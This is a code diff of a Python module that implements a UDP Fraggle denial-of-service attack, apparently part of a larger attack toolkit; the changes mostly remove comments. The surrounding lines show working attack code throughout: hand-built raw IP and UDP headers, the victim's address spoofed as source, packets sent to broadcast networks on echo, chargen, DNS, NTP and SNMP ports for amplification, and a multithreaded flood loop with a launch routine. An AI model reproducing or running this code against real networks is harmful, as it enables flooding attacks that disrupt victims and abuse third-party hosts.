@@ -6,7 +6,6 @@ import threading
 import time
 import random
 
-# Add the current directory to sys.path to handle imports from different execution contexts
 current_dir = os.path.dirname(os.path.abspath(__file__))
 if current_dir not in sys.path:
     sys.path.insert(0, current_dir)
@@ -14,7 +13,6 @@ if current_dir not in sys.path:
 try:
     from attack_strategy import AttackStrategy
 except ImportError:
-    # If direct import fails, try relative import
     from .attack_strategy import AttackStrategy
 
 
@@ -49,7 +47,6 @@ class UDPFraggle(AttackStrategy):
         """
         super().__init__(target_ip, target_port, duration, threads)
 
-        # Common broadcast networks for amplification
         self.broadcast_networks = broadcast_networks or [
             "192.168.1.255",
             "192.168.0.255",
@@ -60,15 +57,15 @@ class UDPFraggle(AttackStrategy):
 
         # Common UDP services for amplification
         self.target_services = [
-            7,  # Echo
+            7,   # Echo
             13,  # Daytime
             19,  # CharGen
             37,  # Time
             53,  # DNS
-            123,  # NTP
-            161,  # SNMP
-            137,  # NetBIOS Name Service
-            138,  # NetBIOS Datagram Service
+            123, # NTP
+            161, # SNMP
+            137, # NetBIOS Name Service
+            138, # NetBIOS Datagram Service
         ]
 
     def _create_ip_header(self, source_ip, dest_ip):
@@ -92,26 +89,23 @@ class UDPFraggle(AttackStrategy):
         |                    Options                    |    Padding    |
         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
         """
-        # IP header fields
-        version = 4  # IPv4
-        ihl = 5  # Internet Header Length (5 * 4 = 20 bytes)
-        type_of_service = 0  # Normal service
-        total_length = 28  # IP header (20) + UDP header (8) = 28 bytes
+        version = 4
+        ihl = 5
+        type_of_service = 0
+        total_length = 28
         identification = random.randint(1, 65535)
-        flags = 0  # No flags set
-        fragment_offset = 0  # No fragmentation
-        ttl = 64  # Time to live
-        protocol = socket.IPPROTO_UDP  # UDP protocol (17)
-        checksum = 0  # Will be calculated later
+        flags = 0
+        fragment_offset = 0
+        ttl = 64
+        protocol = socket.IPPROTO_UDP
+        checksum = 0
 
-        # Convert IP addresses to binary format
         source_addr = socket.inet_aton(source_ip)
         dest_addr = socket.inet_aton(dest_ip)
 
-        # Pack IP header (without checksum)
         ip_header = struct.pack(
             "!BBHHHBBH4s4s",
-            (version << 4) + ihl,  # Version and IHL
+            (version << 4) + ihl,
             type_of_service,
             total_length,
             identification,
@@ -123,10 +117,8 @@ class UDPFraggle(AttackStrategy):
             dest_addr,
         )
 
-        # Calculate checksum
         checksum = self.checksum(ip_header)
 
-        # Repack with correct checksum
         ip_header = struct.pack(
             "!BBHHHBBH4s4s",
             (version << 4) + ihl,
@@ -166,7 +158,6 @@ class UDPFraggle(AttackStrategy):
         # Pack UDP header (without checksum)
         udp_header = struct.pack("!HHHH", source_port, dest_port, udp_length, checksum)
 
-        # Create pseudo header for checksum calculation
         source_addr = socket.inet_aton(source_ip)
         dest_addr = socket.inet_aton(dest_ip)
         placeholder = 0
@@ -177,10 +168,8 @@ class UDPFraggle(AttackStrategy):
         )
         pseudo_packet = pseudo_header + udp_header + data
 
-        # Calculate checksum
         checksum = self.checksum(pseudo_packet)
 
-        # Repack with correct checksum
         udp_header = struct.pack("!HHHH", source_port, dest_port, udp_length, checksum)
 
         return udp_header
@@ -194,17 +183,12 @@ class UDPFraggle(AttackStrategy):
             service_port (int): The target service port
         """
         try:
-            # Create raw socket
             sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
             sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
 
-            # Generate spoofed source IP (victim's IP)
             spoofed_ip = self.target_ip
-
-            # Create payload (simple echo request)
             payload = b"FRAGGLE_ATTACK_PAYLOAD"
 
-            # Create headers
             ip_header = self._create_ip_header(spoofed_ip, broadcast_ip)
             udp_header = self._create_udp_header(
                 spoofed_ip,
@@ -214,16 +198,12 @@ class UDPFraggle(AttackStrategy):
                 payload,
             )
 
-            # Combine packet
             packet = ip_header + udp_header + payload
-
-            # Send packet
             sock.sendto(packet, (broadcast_ip, service_port))
             sock.close()
 
             self.packets_sent += 1
 
-            # Log packet details
             self.logger.debug(
                 f"Sent Fraggle packet: {spoofed_ip} -> {broadcast_ip}:{service_port}"
             )
@@ -244,19 +224,15 @@ class UDPFraggle(AttackStrategy):
 
         while self.attack_active:
             try:
-                # Select random broadcast address and service port
                 broadcast_ip = random.choice(self.broadcast_networks)
                 service_port = random.choice(self.target_services)
 
-                # Send fraggle packet
                 self._send_fraggle_packet(broadcast_ip, service_port)
-
-                # Small delay to prevent overwhelming the system
                 time.sleep(0.001)
 
             except Exception as e:
                 self.logger.error(f"Error in Fraggle worker thread {thread_id}: {e}")
-                time.sleep(0.1)  # Longer delay on error
+                time.sleep(0.1)
 
         self.logger.info(f"Fraggle worker thread {thread_id} stopped")
 
@@ -270,31 +246,25 @@ class UDPFraggle(AttackStrategy):
         3. Monitoring attack progress
         4. Displaying real-time statistics
         """
-        # Check for raw socket privileges
         if not self._check_raw_socket_privileges(socket.IPPROTO_UDP):
             return
 
-        # Display attack header
         self._display_attack_header()
 
-        # Additional attack-specific info
         self._print_info(f"Broadcast networks: {len(self.broadcast_networks)}")
         self._print_info(f"Target services: {len(self.target_services)}")
         self._print_warning(
             "⚠ This attack uses IP spoofing and broadcast amplification"
         )
 
-        # Log attack start
         self.logger.info("UDP Fraggle attack initiated")
         self.logger.info(f"Target: {self.target_ip}:{self.target_port}")
         self.logger.info(f"Broadcast networks: {self.broadcast_networks}")
         self.logger.info(f"Target services: {self.target_services}")
 
-        # Start attack
         self.attack_active = True
         start_time = time.time()
 
-        # Create and start worker threads
         threads = []
         for i in range(self.threads):
             thread = threading.Thread(target=self._fraggle_worker, args=(i,))
@@ -304,18 +274,15 @@ class UDPFraggle(AttackStrategy):
 
         self._print_success(f"✓ Started {len(threads)} attack threads")
 
-        # Monitor attack progress
         try:
             last_count = 0
             while time.time() - start_time < self.duration:
                 time.sleep(1)
 
-                # Calculate current rate
                 current_count = self.packets_sent
                 rate = current_count - last_count
                 last_count = current_count
 
-                # Display progress
                 elapsed = time.time() - start_time
                 remaining = self.duration - elapsed
 
@@ -326,7 +293,6 @@ class UDPFraggle(AttackStrategy):
                     rate_color,
                 )
 
-                # Log progress
                 if current_count % 1000 == 0:
                     self.logger.info(
                         f"Progress: {current_count} packets sent, {rate} pps"
@@ -337,15 +303,12 @@ class UDPFraggle(AttackStrategy):
             self.logger.warning("Attack interrupted by user")
 
         finally:
-            # Stop attack
             self.attack_active = False
             self._print_info("Stopping attack threads...")
 
-            # Wait for threads to complete
             for thread in threads:
                 thread.join(timeout=1.0)
 
-            # Display completion statistics
             self._display_attack_completion(start_time)
 
 
@@ -362,7 +325,6 @@ def main():
     # Custom broadcast networks (optional)
     broadcast_networks = ["192.168.1.255", "10.0.0.255", "172.16.0.255"]
 
-    # Create and execute attack
     attack = UDPFraggle(target_ip, target_port, duration, threads, broadcast_networks)
     attack.attack()
 
